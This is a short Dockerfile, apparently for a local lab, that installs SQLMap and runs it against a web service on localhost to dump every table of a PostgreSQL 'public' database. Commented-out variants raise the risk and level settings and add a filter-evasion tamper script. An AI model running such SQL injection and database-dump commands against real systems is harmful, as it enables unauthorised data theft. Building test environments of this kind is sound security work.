FROM debian:11-slim

# Installation des dépendances
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    git \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Clonage de SQLMap
WORKDIR /opt
RUN git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

# Use the sqlmap command
#CMD ["bash", "-c", "until curl -s http://web:8080 > /dev/null; do sleep 5; done && python3 /opt/sqlmap/sqlmap.py -u 'http://localhost:8080?username=test' --batch --dump-all -D 'public'"]
#CMD bash -c "until curl -s http://localhost:8080 > /dev/null; do sleep 5; done && python3 /opt/sqlmap/sqlmap.py -u 'http://web/index.php?username=test' --banner --batch --dump-all -D public"
#CMD bash -c "\
#  echo '[+] Attente du service web...' && \
#  sleep 5; \
#  echo '[+] Lancement de sqlmap...' && \
#  python3 /opt/sqlmap/sqlmap.py \
#    -u 'http://localhost:8080/index.php?username=test' \
#    --risk=3 --level=5 --technique=BEUSTQ \
#    --banner --dbs \
#    --tamper=space2comment \
#    --batch --dbms=PostgreSQL \
#    --dump-all -D public && \
#  echo '[+] Attaque terminée.'"


CMD bash -c "\
  sleep 5; \
  python3 /opt/sqlmap/sqlmap.py \
    -u 'http://localhost:80/index.php?username=test' \
    --banner \
    --batch \
    --dump-all -D 'public' && \
  echo '[+] Attaque terminée.'"
